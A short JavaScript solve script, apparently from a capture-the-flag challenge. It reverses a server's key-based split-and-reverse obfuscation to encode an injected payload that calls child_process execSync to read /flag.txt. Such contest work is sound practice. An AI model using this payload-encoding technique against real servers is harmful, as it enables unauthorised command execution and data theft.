const key = "vOc!&6k(G;uNSqjQBt=M"

function reverse(t){
    for(var i = 0; i<t.length;i+=1){
        t = t.split(key[i%key.length]).reverse().join(key[i%key.length]);
    }
    return t
}

// Obfuscation on server
function decrypt(t){
    for(var i = t.length-1; i>=0; i-=1){
        t = t.split(key[i%key.length]).reverse().join(key[i%key.length]);
    }
    return t
}

const str = "require('child_process').execSync('cat /flag.txt > res.txt')"

encrypted = reverse(str)
decrypted = decrypt(encrypted)

process.stderr.write("Original: "+str+"\n")
process.stderr.write("Encrypted:"+encrypted+"\n")
// console.log(encodeURI(encrypted).replace(/'/g, '%27'))
console.log(encrypted)
